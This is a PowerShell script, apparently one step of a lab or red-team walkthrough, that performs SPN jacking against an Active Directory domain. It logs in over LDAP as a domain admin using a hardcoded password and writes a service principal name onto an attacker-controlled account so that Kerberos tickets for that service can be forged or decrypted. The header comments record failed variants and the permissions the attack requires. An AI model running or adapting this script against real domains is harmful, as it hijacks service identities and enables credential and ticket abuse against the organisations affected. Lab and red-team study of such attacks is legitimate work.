# WT027 — SPN Jacking (CVE-2026-25177) — plant a service SPN on a controlled account
# Source machine: ws01 (direct SSH per Rule 1) — binds LDAP as chief_command (DA, earned via Branch A T015)
# Target: plant free SPN on cadre.local analyst_cloud (attacker-controlled) via dc01 (192.168.77.10)
#
# FINDINGS 2026-08-01 (documented command NOT viable — real AD behavior):
#   (1) `MSSQLSvc/mbr01.child.cadre.local:1433` is owned by `child\svc_mssql`
#       (CN=svc_mssql,OU=Operations,DC=child,DC=cadre,DC=local) -> forest-wide SPN uniqueness
#       -> analyst_cloud self-add = "A constraint violation occurred".
#   (2) A FREE service SPN for another host (`MSSQLSvc/mbr01.child.cadre.local:14333`) via
#       SELF-write = "Access is denied" -> the default "Validated write to service principal
#       name" on SELF only allows SPNs for the account's OWN host, not cross-host service SPNs.
#   => SPN jacking requires writeSPN on the target account (or DA). Demonstrated below as
#      chief_command (DA): plant the SPN on analyst_cloud -> KDC issues TGS for that SPN
#      encrypted with analyst_cloud's key (attacker knows it) = hijacked service identity.
$ErrorActionPreference = 'Stop'

$dc   = '192.168.77.10'
$user = 'cadre\chief_command'
$pass = 'C0mm@nd_Ch1ef!'
$spn  = 'MSSQLSvc/dc01.cadre.local:14333'   # free SPN, SAME realm as TGT (cross-realm variant hit KDC_ERR_WRONG_REALM in Rubeus asktgs)
$dn   = 'CN=analyst_cloud,OU=Cloud,DC=cadre,DC=local'

try {
    # 1) Before
    $de = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc/$dn", $user, $pass)
    $de.RefreshCache(@('servicePrincipalName'))
    $before = @($de.Properties['servicePrincipalName'])
    Write-Output ("BEFORE_SPNS=" + ($before -join '|'))

    # 2) Add the SPN (self validated-write to servicePrincipalName)
    $de.Properties['servicePrincipalName'].Add($spn)
    $de.CommitChanges()
    Write-Output "SPN_ADDED"

    # 3) After — read back
    $de2 = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$dc/$dn", $user, $pass)
    $de2.RefreshCache(@('servicePrincipalName'))
    $after = @($de2.Properties['servicePrincipalName'])
    Write-Output ("AFTER_SPNS=" + ($after -join '|'))

    if ($after -contains $spn) {
        Write-Output "WT027_VERIFY_OK"
    } else {
        Write-Output "WT027_VERIFY_FAIL"
    }
}
catch {
    Write-Output ("WT027_ERROR=" + $_.Exception.Message)
    exit 1
}
